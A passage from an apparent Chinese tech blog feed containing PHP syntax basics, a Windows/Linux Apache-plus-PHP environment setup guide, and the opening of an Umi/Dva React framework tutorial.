十六进制，以 <code>0x</code> 开头</li></ul><p>对于浮点型型，计算可能不准确：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="number">2.1</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$f</span> / <span class="number">3</span> == <span class="number">0.7</span>); <span class="comment">// bool(false)</span></span><br></pre></td></tr></table></figure><p>同时还可以使用如下的方法判断数据是否为空：</p><ul><li><code>empty()</code>: 判断数据的值是否为空，如空字符串、null、空数组、布尔值为 false 的、未定义的变量，返回都是 <code>true</code></li><li><code>isset()</code>：判断数据存储的变量值本身是否存在，如变量值为 null 的、变量定义却未赋值的、未定义的变量，返回都是 <code>false</code></li><li><code>is_null</code>：与 <code>isset</code> 的定义正好相反</li></ul><h1 id="4-运算"><a href="#4-运算" class="headerlink" title="4. 运算"></a>4. 运算</h1><h2 id="4-1-连接运算符"><a href="#4-1-连接运算符" class="headerlink" title="4.1 连接运算符"></a>4.1 连接运算符</h2><p>使用 <code>.</code> 可以将变量连接起来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> . <span class="variable">$b</span>; <span class="comment">// hello 123</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> .= <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">// hello 123</span></span><br></pre></td></tr></table></figure><h2 id="4-2-错误抑制符"><a href="#4-2-错误抑制符" class="headerlink" title="4.2 错误抑制符"></a>4.2 错误抑制符</h2><p>使用 <code>@</code> 可以抑制报错，使代码继续向后执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">233</span>;</span><br><span class="line">@( <span class="variable">$a</span> / <span class="number">0</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">// 233</span></span><br></pre></td></tr></table></figure><h2 id="4-3-三元运算符"><a href="#4-3-三元运算符" class="headerlink" title="4.3 三元运算符"></a>4.3 三元运算符</h2><p>支持</p><h2 id="4-4-逻辑运算"><a href="#4-4-逻辑运算" class="headerlink" title="4.4 逻辑运算"></a>4.4 逻辑运算</h2><p>与 Javascript 用法一致</p><h2 id="4-5-位运算符"><a href="#4-5-位运算符" class="headerlink" title="4.5 位运算符"></a>4.5 位运算符</h2><ul><li><code>&amp;</code> 按位与，两个位都未1，结果为1，否则为0</li><li><code>|</code> 按位或，两个有一个为1，结果为1</li><li><code>~</code> 按位非，一个位如果为1则变成0，否则反之</li><li><code>^</code> 按位异或，两个相同则为0，不同则为1</li><li><code>&lt;&lt;</code> 按位左移，整个位（32位）</li><li><code>&gt;&gt;</code> 按位右移</li></ul><p>举例1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">5</span>; </span><br><span class="line"><span class="variable">$b</span> = -<span class="number">5</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span> &amp; <span class="variable">$b</span>); <span class="comment">// int(1)</span></span><br></pre></td></tr></table></figure><p>原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 5 的源码：00000101  </span><br><span class="line">-5 的源码：11111010  </span><br><span class="line"> &amp; 的运算：00000001</span><br></pre></td></tr></table></figure><p>举例2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = -<span class="number">5</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span> &gt;&gt; <span class="number">2</span>); <span class="comment">// int(-2)</span></span><br></pre></td></tr></table></figure><p>原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-5   11111011</span><br><span class="line">&gt;&gt;1  11111110 // 运算结果：补码</span><br><span class="line">-1   11111101 // 反码</span><br><span class="line">取反  10000010 // 原码：-2</span><br></pre></td></tr></table></figure><h1 id="5-循环"><a href="#5-循环" class="headerlink" title="5. 循环"></a>5. 循环</h1><p>for 循环：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">3</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$i</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>foreach 循环：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="keyword">array</span>(<span class="string">&quot;one&quot;</span>,<span class="string">&quot;two&quot;</span>,<span class="string">&quot;three&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$value</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">one</span><br><span class="line">two</span><br><span class="line">three</span><br></pre></td></tr></table></figure><p>while 循环：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span>&lt;=<span class="number">5</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;The number is &quot;</span> . <span class="variable">$i</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The number is 1</span><br><span class="line">The number is 2</span><br><span class="line">The number is 3</span><br><span class="line">The number is 4</span><br><span class="line">The number is 5</span><br></pre></td></tr></table></figure><p>do…while 循环：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="variable">$i</span>++;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;The number is &quot;</span> . <span class="variable">$i</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span>&lt;=<span class="number">5</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The number is 2</span><br><span class="line">The number is 3</span><br><span class="line">The number is 4</span><br><span class="line">The number is 5</span><br><span class="line">The number is 6</span><br></pre></td></tr></table></figure><h1 id="5-函数"><a href="#5-函数" class="headerlink" title="5. 函数"></a>5. 函数</h1><p>创建函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functionName</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">functionName</span>(<span class="string">&quot;huahua&quot;</span>); <span class="comment">// &#x27;huahua&#x27;</span></span><br></pre></td></tr></table></figure><p>默认参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setHeight</span>(<span class="params"><span class="variable">$minheight</span>=<span class="number">50</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;The height is : <span class="subst">$minheight</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="6-数组"><a href="#6-数组" class="headerlink" title="6. 数组"></a>6. 数组</h1><h2 id="6-1-数组"><a href="#6-1-数组" class="headerlink" title="6.1 数组"></a>6.1 数组</h2><p>创建数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cars</span> = <span class="keyword">array</span>(<span class="string">&quot;porsche&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Volvo&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cars</span>[<span class="number">0</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span> (<span class="variable">$cars</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">porsche</span><br><span class="line"></span><br><span class="line">array(3) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(7) &quot;porsche&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(3) &quot;BMW&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(5) &quot;Volvo&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>php 中的数组是值类型的。</p></blockquote><h2 id="6-2-关联数组"><a href="#6-2-关联数组" class="headerlink" title="6.2 关联数组"></a>6.2 关联数组</h2><p>创建关联数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$age</span> = <span class="keyword">array</span>(<span class="string">&quot;Bill&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Steve&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Elon&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>[<span class="string">&#x27;Elon&#x27;</span>]; <span class="comment">// 43</span></span><br></pre></td></tr></table></figure><p>从 PHP 5.4 起可以使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span> = [</span><br><span class="line">    <span class="string">&quot;foo&quot;</span> =&gt; <span class="string">&quot;bar&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bar&quot;</span> =&gt; <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>遍历关联数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$age</span> <span class="keyword">as</span> <span class="variable">$x</span>=&gt;<span class="variable">$x_value</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Key=&quot;</span> . <span class="variable">$x</span> . <span class="string">&quot;, Value=&quot;</span> . <span class="variable">$x_value</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 开发环境搭建指引</title>
      <link href="/2019/12/b92ba13a43b9.html"/>
      <url>/2019/12/b92ba13a43b9.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-Apache"><a href="#1-Apache" class="headerlink" title="1. Apache"></a>1. Apache</h1><h2 id="1-1-Windows-端安装-Apache"><a href="#1-1-Windows-端安装-Apache" class="headerlink" title="1.1 Windows 端安装 Apache"></a>1.1 Windows 端安装 Apache</h2><p>Windows 端安装 (Apache Haus)[<a href="https://www.apachehaus.com/cgi-bin/download.plx]，选择">https://www.apachehaus.com/cgi-bin/download.plx]，选择</a> x64 版本，下载完成之后是一个压缩包：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191211161848.png" alt=""></p><p>将文件解压到任意一个工作目录，如：<code>D:/Apache24</code>，之后打开 Apache 目录下的 <code>/conf/httpd.conf</code> ，修改配置文件：</p><ol><li>初次修改必须要修改 <code>Define SRVROOT</code>，将其更改为我们解压后所放置的工作目录；</li><li><code>Listen</code> 选项为服务的开启的端口，默认为 <code>80</code>，如果该端口被占用，需要改变端口号才可以启动 Apache 服务。</li></ol><p>之后进入 <code>/bin</code> 目录下，使用有管理员权限的 <code>cmd</code> 或者 <code>powershell</code>，输入 <code>httpd.exe</code> 即可开启服务。</p><p>Windows 端的 apache 目录结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">├─bin             # windows 可执行二进制文件</span><br><span class="line">│  └─iconv</span><br><span class="line">├─cgi-bin</span><br><span class="line">├─conf            # 配置文件</span><br><span class="line">│  ├─extra</span><br><span class="line">│  ├─original</span><br><span class="line">│  │  └─extra</span><br><span class="line">│  └─ssl</span><br><span class="line">├─error</span><br><span class="line">│  └─include</span><br><span class="line">├─htdocs          # 静态文件访问目录</span><br><span class="line">├─icons</span><br><span class="line">│  └─small</span><br><span class="line">├─include</span><br><span class="line">├─lib</span><br><span class="line">├─logs</span><br><span class="line">└─modules         # Apache 加载模块</span><br></pre></td></tr></table></figure><p>之后可以将 Apache 安装为系统服务，那样便可以使用 <code>bin</code> 目录下的 <code>ApacheMonitor.exe</code> 工具，一键开启与重启 Apache 服务器（注意这里必须使用管理员权限运行命令行程序，并保证设置的端口没有被占用）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd -k install</span><br></pre></td></tr></table></figure><h2 id="1-2-Apaceh-常用指令"><a href="#1-2-Apaceh-常用指令" class="headerlink" title="1.2 Apaceh 常用指令"></a>1.2 Apaceh 常用指令</h2><p>查看模块状况：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">httpd.exe -M</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;static&gt; 为静态加载模块</span></span><br><span class="line"><span class="comment"># &lt;shared&gt; 为动态加载模块</span></span><br></pre></td></tr></table></figure><p>验证配置文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">httpd -t</span><br><span class="line"></span><br><span class="line"><span class="comment"># Syntax OK 表示没有错误</span></span><br></pre></td></tr></table></figure><blockquote><p>Ubuntu 环境下需要使用 <code>apachectl</code> 替代 <code>httpd</code></p></blockquote><h1 id="2-PHP"><a href="#2-PHP" class="headerlink" title="2. PHP"></a>2. PHP</h1><h2 id="2-1-PHP-环境配置"><a href="#2-1-PHP-环境配置" class="headerlink" title="2.1 PHP 环境配置"></a>2.1 PHP 环境配置</h2><p>上官网安装<a href="https://windows.php.net/download">适用于 Windows 的 PHP</a>，<strong>注意要下载 Thread Safe 版本，否则没有 Apache 的模块</strong>。</p><p>下载同样是一个压缩包格式的文件，将其解压并放置到自定的目录，其目录结构为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">├─dev</span><br><span class="line">├─ext                      # 扩展包</span><br><span class="line">├─extras</span><br><span class="line">│  └─ssl</span><br><span class="line">├─lib</span><br><span class="line">│  └─enchant</span><br><span class="line">└─sasl2</span><br><span class="line"></span><br><span class="line">- php.exe                  # 交互式解释器</span><br><span class="line">- php.ini-development      # 开发版配置文件</span><br><span class="line">- php.ini-production       # 生产环境下的配置文件</span><br><span class="line">- php7apache2_4.dll        # apahce 支持文件</span><br><span class="line">- php7apache2_4filter.dll  # apahce 支持文件</span><br></pre></td></tr></table></figure><p>执行 php 文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php.exe -f /dirName/fileName.php</span><br></pre></td></tr></table></figure><p>将 php 环境的目录设置到系统 PATH 中，即可直接编译运行 php 文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// helloworld.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php helloword.php</span><br><span class="line">&gt; hello world</span><br></pre></td></tr></table></figure><h2 id="2-2-Apache-加载-PHP-模块"><a href="#2-2-Apache-加载-PHP-模块" class="headerlink" title="2.2 Apache 加载 PHP 模块"></a>2.2 Apache 加载 PHP 模块</h2><p>打开 Apache 配置文件，在 LoadModule 处添加模块路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># httpd.conf</span><br><span class="line">LoadModule php7_module &#x27;C:/Program Files/php/7.4.0/php7apache2_4.dll&#x27;</span><br></pre></td></tr></table></figure><p>之后可以通过 <code>httpd -t</code> 来检查配置文件是否可用，同时使用 <code>httpd -M</code> 可以看到新增的模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php7_module (shared)</span><br></pre></td></tr></table></figure><p>除此之外，我们还要显式配置 Apache 支持读取 php 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># httpd.conf</span><br><span class="line">AddType application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>此时已可以将 php 文件放置到 <code>Apache24/htdocs/</code> 目录下，服务器即可处理 php 文件了。</p><h2 id="3-3-Apache-加载-PHP-配置文件"><a href="#3-3-Apache-加载-PHP-配置文件" class="headerlink" title="3.3 Apache 加载 PHP 配置文件"></a>3.3 Apache 加载 PHP 配置文件</h2><p>由于 Apache 是运行 php 的环境，所以 php 的相关设置比如加载模块，需要让 Apache 读取，因此我们要让 Apache 去加载 PHP 的配置文件。</p><blockquote><p>以下配置仅适用于 Windows 平台</p></blockquote><p>在 Apache 配置文件中添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># httpd.conf</span><br><span class="line">PHPIniDir &#x27;C:/Program Files/php/7.4.0&#x27;</span><br></pre></td></tr></table></figure><p>由于 PHP 环境下载下来之后，相关的配置文件并没有进行初始化操作，我们需要在 PHP 目录下创建一个 <code>php.ini</code> 文件，我们可以将 <code>php.ini-development</code> 复制一份并重命名为 <code>php.ini</code> 完成初始化操作。</p><p>之后我们可以在 apache 静态文件目录下（windows 平台在为 Apache 目录下的 htdocs 文件夹）中创建一个 <code>info.php</code>，输入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// info.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p>访问 <code>http://localhost/env.php</code> 既可看到当前的 php 环境配置详情：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191219111739.png" alt="inof.php"></p><blockquote><p>php 的很大一个好处就是可以热更新，无需重启服务器修改文件即可生效，当然加载模块还是要重启服务器的。</p></blockquote><h2 id="3-4-PHP-选择加载模块"><a href="#3-4-PHP-选择加载模块" class="headerlink" title="3.4 PHP 选择加载模块"></a>3.4 PHP 选择加载模块</h2><p>通过以上的设置，Apache 已经能够处理 PHP 文件了，但是 PHP 还有众多扩展包可以供我们使用，比如 <code>mysqli</code> 扩展可以帮助我们连接 myslq，只有我们启用了这些扩展，才可以在 PHP 中使用这些服务。</p><p>这里以启用 <code>myslqi</code> 扩展为例，打开 <code>php.ini</code> 文件，在 <code>;extension=mysqli</code> 这一行取消掉前面的 <code>;</code> 即启用该插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;php.ini</span><br><span class="line">extension=mysqli</span><br></pre></td></tr></table></figure><blockquote><p>在 php7.3 以下版本，<code>mysqli</code> 可能被写为 <code>php_mysqli.dll</code>，这里也可以填写一个绝对路径来指向插件的存放位置。</p></blockquote><p>在 Windows 平台上还需要额外配置 PHP 扩展的路径，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;php.ini</span><br><span class="line">extension_dir = &quot;C:/Progarm Files/php/7.4.0/ext/&quot;</span><br></pre></td></tr></table></figure><blockquote><p>Ubuntu 可以通过查看 phpinfo 来获取插件的默认路径。</p></blockquote><h2 id="3-5-设置-PHP-时区"><a href="#3-5-设置-PHP-时区" class="headerlink" title="3.5 设置 PHP 时区"></a>3.5 设置 PHP 时区</h2><p>系统默认的时区并不安全，需要手动切换为当前国家的时区：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date.timezone = RPC</span><br></pre></td></tr></table></figure><h2 id="3-6-Linux-系统下的注意事项"><a href="#3-6-Linux-系统下的注意事项" class="headerlink" title="3.6 Linux 系统下的注意事项"></a>3.6 Linux 系统下的注意事项</h2><ul><li><p>Linux 系统下可能会安装多个 PHP 版本，可以用 <code>php --verison</code> 查看当前 php 版本。</p></li><li><p>PHP 的目录为 <code>/etc/php</code>，在该目录下可以看到多个 PHP 版本。</p></li><li><p>PHP 命令行环境下与 Apache 环境下加载的 <code>php.ini</code> 文件是不一样的。</p><ul><li>命令行环境下执行的是 <code>/etc/php/[php_version]/cli/php.ini</code>，命令行中使用 <code>php -i | grep php.ini</code> 可以查看。</li><li>Apache 环境下加载的是 <code>/etc/php/[php_version]/cli/php.ini</code>，php 文件中使用 <code>phpinfo()</code> 方法输出当前环境可以查看。</li></ul></li><li><p>模块位置在 <code>/usr/lib/php/[php_api_version]/</code> 目录下存放。</p><ul><li>该位置可以按照 windows 上的设置方式显式指定（不推荐更改）。</li><li>该位置不同的 php 版本不一样，具体看当前的 PHP API 的值。</li><li>命令行环境与 Apache 环境中对于扩展的路径是相同的，命令行环境下使用 <code>php -i | grep extension_dir</code> 查看。</li></ul></li><li><p>如果安装有多个版本的 php 可以使用 <code>php[version]</code> 来执行不同版本的 php ，如 <code>php7.2 --version</code>。</p></li></ul><blockquote><p>可以在 <code>/usr/bin</code> 目录下查看当前所可执行的 php 版本</p></blockquote><ul><li>如果要手动安装扩展，需要安装当前版本的 <code>dev</code> 开发工具，比如 php7.3 需要安装 <code>php7.3-dev</code>。<ul><li>dev 工具中的 phpize 可以用来编译扩展，与多版本的 php 使用类似，可以使用 <code>phpize[version]</code> 来切换不同版本的编译工具</li><li>dev 工具中可以调用 <code>php-config</code> 来查看当前开发工具对应的 php 环境，如果当前设备安装了 <code>php7.3</code> 而 dev 工具是 <code>php7.2-dev</code> ，那么当前的环境只会是 php7.2 的环境，响应的编译的文件也会编译到 <code>php7.2</code> 的扩展路径中。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 快速使用 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 开发框架 —— Umi 与 Dva 的快速使用指南</title>
      <link href="/2019/12/40c2fd2ada1b.html"/>
      <url>/2019/12/40c2fd2ada1b.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-UMI"><a href="#1-UMI" class="headerlink" title="1. UMI"></a>1. UMI</h1><blockquote><p>umi 可以简单地理解为 roadhog + 路由，思路类似 next.js/nuxt.js，辅以一套插件机制，目的是通过框架的方式简化 React 开发</p></blockquote><h2 id="1-1-快速使用"><a href="#1-1-快速使用" class="headerlink" title="1.1 快速使用"></a>1.1 快速使用</h2><p>安装 umi：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add global umi</span><br></pre></td></tr></table></figure><p>快速创建一个项目：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> umi-demo &amp;&amp; <span class="built_in">cd</span> umi-demo</span><br><span class="line">yarn create umi</span><br><span class="line">yarn <span class="comment"># 安装依赖</span></span><br></pre></td></tr></table></figure><p>运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn start</span><br></pre></td></tr></table></figure><h2 id="1-2-文件约定"><a href="#1-2-文件约定" class="headerlink" title="1.2 文件约定"></a>1.2 文件约定</h2><p>umi 会在每次构建时根据文件规范自动生成路由，文件约定如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── dist/                          // 默认的 build 输出目录</span><br><span class="line">├── mock/                          // mock 文件所在目录，基于 express</span><br><span class="line">├── config/</span><br><span class="line">    ├── config.js                  // umi 配置，同 .umirc.js，二选一</span><br><span class="line">└── src/                           // 源码目录，可选</span><br><span class="line">    ├── layouts/index.js           // 全局布局</span><br><span class="line">    ├── pages/                     // 页面目录，里面的文件即路由</span><br><span class="line">        ├── .umi/                  // dev 临时目录，需添加到 .gitignore</span><br><span class="line">        ├── .umi-production/       // build 临时目录，会自动删除</span><br><span class="line">        ├── document.ejs           // HTML 模板</span><br><span class="line">        ├── 404.js                 // 404 页面</span><br><span class="line">        ├── page1.js               // 页面 1，任意命名，导出 react 组件</span><br><span class="line">        ├── page1.test.js          // 用例文件，umi test 会匹配所有 .test.js 和 .e2e.js 结尾的文件</span><br><span class="line">        └── page2.js               // 页面 2，任意命名</span><br><span class="line">    ├── global.css                 